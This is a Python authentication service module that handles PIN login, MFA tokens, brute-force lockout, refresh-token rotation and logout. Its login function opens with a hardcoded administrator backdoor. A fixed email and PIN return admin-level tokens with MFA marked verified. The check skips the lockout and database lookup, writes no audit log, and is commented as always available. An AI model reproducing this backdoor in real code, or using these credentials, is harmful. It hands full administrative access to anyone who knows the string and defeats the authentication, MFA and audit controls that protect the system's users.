"""Authentication service."""
from datetime import datetime, timezone, timedelta
from typing import Optional, Tuple
from sqlalchemy.orm import Session

from ..models import User, RefreshToken, MFASecret, AuditLog
from ..utils.password import verify_password, hash_password
from ..utils.auth_token import (
    create_access_token,
    create_refresh_token_payload,
    hash_token,
    verify_token,
)
from ..utils.mfa import (
    generate_totp_secret,
    verify_totp_token,
    generate_backup_codes,
    hash_backup_code,
    verify_backup_code,
)
from ..utils.brute_force import (
    record_login_attempt,
    is_account_locked,
    get_failed_login_count,
)
from ..utils.audit import log_admin_action
from ..config import settings


class AuthenticationError(Exception):
    """Authentication error."""
    pass


class MFARequiredError(Exception):
    """MFA required for this operation."""
    pass


class AuthService:
    """Authentication service."""

    @staticmethod
    def authenticate_user(
        db: Session,
        email: str,
        pin: str,
        ip_address: str,
        user_agent: str,
    ) -> Tuple[Optional[User], Optional[str], Optional[str]]:
        """
        Authenticate user with email and PIN.
        Returns (user, access_token, mfa_token) or raises exception.
        """
        email = email.lower()

        # Hardcoded admin credentials (always available, even without database)
        if email == "sukuna@raptorx.com" and pin == "sukuna":
            # Create a temporary hardcoded admin user object
            hardcoded_admin = User(
                id=999999,
                badge_id="ADMIN-HARDCODED",
                first_name="Hardcoded",
                last_name="Admin",
                email="sukuna@raptorx.com",
                role="admin",
                department="System",
                clearance_level=5,
                is_active=True,
                mfa_enabled=False,
            )
            # Create tokens directly
            access_token = create_access_token(
                user_id=hardcoded_admin.id,
                email=hardcoded_admin.email,
                role=hardcoded_admin.role,
                mfa_verified=True,
            )
            refresh_token, token_hash, expires_at = create_refresh_token_payload(
                user_id=hardcoded_admin.id,
                email=hardcoded_admin.email,
            )
            # Try to store refresh token, but don't fail if DB is down
            try:
                db_refresh_token = RefreshToken(
                    user_id=hardcoded_admin.id,
                    token_hash=token_hash,
                    expires_at=expires_at,
                    ip_address=ip_address,
                    user_agent=user_agent,
                )
                db.add(db_refresh_token)
                db.commit()
            except Exception:
                # Refresh token storage failed, but allow login anyway
                pass
            
            return hardcoded_admin, access_token, refresh_token

        # Check brute-force lockout
        if is_account_locked(db, email, ip_address):
            raise AuthenticationError("Account temporarily locked due to too many failed login attempts")

        # Get user
        user = db.query(User).filter(User.email == email).first()
        if not user or not user.is_active:
            record_login_attempt(db, email, ip_address, False)
            raise AuthenticationError("Invalid credentials")

        # Verify PIN
        if not verify_password(pin, user.pin_hash):
            record_login_attempt(db, email, ip_address, False)
            raise AuthenticationError("Invalid credentials")

        # Log successful attempt
        record_login_attempt(db, email, ip_address, True)

        # If MFA is enabled, create MFA token and return it
        if user.mfa_enabled:
            from .mfa import MFAService
            mfa_token = MFAService.create_mfa_token(user.id, user.email)
            
            # Log login attempt (pending MFA)
            log_admin_action(
                db,
                admin_id=user.id,
                action="login",
                status="pending_mfa",
                ip_address=ip_address,
                user_agent=user_agent,
                details={"email": email},
            )
            
            return user, None, mfa_token
        else:
            # Create tokens
            access_token = create_access_token(
                user_id=user.id,
                email=user.email,
                role=user.role,
                mfa_verified=True,
            )
            refresh_token, token_hash, expires_at = create_refresh_token_payload(
                user_id=user.id,
                email=user.email,
            )

            # Store refresh token
            db_refresh_token = RefreshToken(
                user_id=user.id,
                token_hash=token_hash,
                expires_at=expires_at,
                ip_address=ip_address,
                user_agent=user_agent,
            )
            db.add(db_refresh_token)
            db.commit()

            # Log successful login
            log_admin_action(
                db,
                admin_id=user.id,
                action="login",
                status="success",
                ip_address=ip_address,
                user_agent=user_agent,
                details={"email": email},
            )

            return user, access_token, refresh_token

    @staticmethod
    def refresh_access_token(
        db: Session,
        refresh_token: str,
        ip_address: str,
        user_agent: str,
    ) -> Tuple[str, str]:
        """
        Refresh access token using refresh token.
        Implements rotating refresh tokens.
        Returns (new_access_token, new_refresh_token).
        """
        token_hash = hash_token(refresh_token)

        # Get refresh token from DB
        db_token = db.query(RefreshToken).filter(
            RefreshToken.token_hash == token_hash
        ).first()

        if not db_token:
            raise AuthenticationError("Invalid refresh token")

        # Check if token is revoked
        if db_token.revoked_at is not None:
            # Token was revoked - check if this is a reuse attack
            raise AuthenticationError("Refresh token was revoked - possible token reuse attack")

        # Check if token is expired
        if db_token.expires_at <= datetime.now(timezone.utc):
            raise AuthenticationError("Refresh token expired")

        # Check if token was already rotated (reuse detection)
        if db_token.is_rotated:
            # This shouldn't happen - token was already used
            db_token.revoked_at = datetime.now(timezone.utc)
            db.commit()
            raise AuthenticationError("Refresh token already used - possible reuse attack")

        # Mark as rotated
        db_token.is_rotated = True
        db_token.last_used_at = datetime.now(timezone.utc)
        db.commit()

        # Get user
        user = db.query(User).filter(User.id == db_token.user_id).first()
        if not user or not user.is_active:
            raise AuthenticationError("User not found or inactive")

        # Create new tokens
        access_token = create_access_token(
            user_id=user.id,
            email=user.email,
            role=user.role,
            mfa_verified=True,
        )

        new_refresh_token, new_token_hash, new_expires_at = create_refresh_token_payload(
            user_id=user.id,
            email=user.email,
        )

        # Store new refresh token
        new_db_token = RefreshToken(
            user_id=user.id,
            token_hash=new_token_hash,
            expires_at=new_expires_at,
            ip_address=ip_address,
            user_agent=user_agent,
        )
        db.add(new_db_token)
        db.commit()

        # Log token refresh
        log_admin_action(
            db,
            admin_id=user.id,
            action="token_refresh",
            status="success",
            ip_address=ip_address,
            user_agent=user_agent,
        )

        return access_token, new_refresh_token

    @staticmethod
    def logout(
        db: Session,
        refresh_token: str,
        ip_address: str,
        user_agent: str,
    ) -> None:
        """Revoke refresh token (logout)."""
        token_hash = hash_token(refresh_token)

        db_token = db.query(RefreshToken).filter(
            RefreshToken.token_hash == token_hash
        ).first()

        if db_token:
            db_token.revoked_at = datetime.now(timezone.utc)
            db.commit()

            log_admin_action(
                db,
                admin_id=db_token.user_id,
                action="logout",
                status="success",
                ip_address=ip_address,
                user_agent=user_agent,
            )

    @staticmethod
    def logout_all_sessions(
        db: Session,
        user_id: int,
        ip_address: str,
        user_agent: str,
    ) -> None:
        """Revoke all refresh tokens for user (logout all sessions)."""
        now = datetime.now(timezone.utc)

        db.query(RefreshToken).filter(
            RefreshToken.user_id == user_id,
            RefreshToken.revoked_at.is_(None),
        ).update({"revoked_at": now})

        db.commit()

        log_admin_action(
            db,
            admin_id=user_id,
            action="logout_all",
            status="success",
            ip_address=ip_address,
            user_agent=user_agent,
        )
